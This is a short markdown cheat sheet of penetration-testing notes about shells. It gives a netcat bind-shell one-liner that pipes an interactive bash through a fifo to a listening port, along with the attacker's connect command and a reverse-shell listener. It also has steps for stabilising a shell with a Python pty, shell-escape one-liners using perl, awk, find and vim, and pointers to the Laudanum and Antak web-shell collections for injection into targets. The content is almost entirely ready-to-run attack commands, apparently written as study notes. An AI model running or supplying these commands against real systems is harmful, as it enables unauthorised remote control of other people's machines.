# Shells
## Bind shells
Target machine has a listener that is awaiting a connection from the attacking machine.

### Netcat
__Target__: ```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target IP> <port> > /tmp/f```  
__Attacker__: ```nc -nv <target IP> <port>```

## Reverse shells
Attacking machine has a listener that is awaiting a connection from the target machine.

### Netcat
__Attacker__: ```sudo nc -lvnp 443```

### Stabilising a reverse shell
Target must have Python installed.

1. Import pty module and spawn bash shell: ```python3 -c 'import pty;pty.spawn("/bin/bash")'```
2. Press ```CTRL + Z``` to background process and get back to host machine
3. Use stty command: ```stty raw -echo; fg```
4. Set the terminal emulator to xterm: ```export TERM=xterm```
5. Press ```Enter```

### Spawning an interactive shell
- Python: ```python -c 'import pty; pty.spawn("/bin/sh")'```  
- Perl: ```perl —e 'exec "/bin/sh";'```
- Ruby (run from script): ```ruby: exec "/bin/sh"```
- Lua (run from script): ```lua: os.execute('/bin/sh')```
- Awk: ```awk 'BEGIN {system("/bin/sh")}'```
- Find: 
    - ```find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;```
    - ```find . -exec /bin/sh \; -quit```
- Vim: 
    - ```vim -c ':!/bin/sh'```
    - ```vim```  
    ```:set shell=/bin/sh```  
    ```:shell```

## Web shells
### Laudanum
Repository of files in the ```/usr/share/webshells/laudanum``` directory that can be used for injection into a target machine to gain a reverse shell or execute commands.

### Antak
ASP.Net web shell that utilises PowerShell to interact with the host, found in the ```/usr/share/nishang/Antak-WebShell``` directory.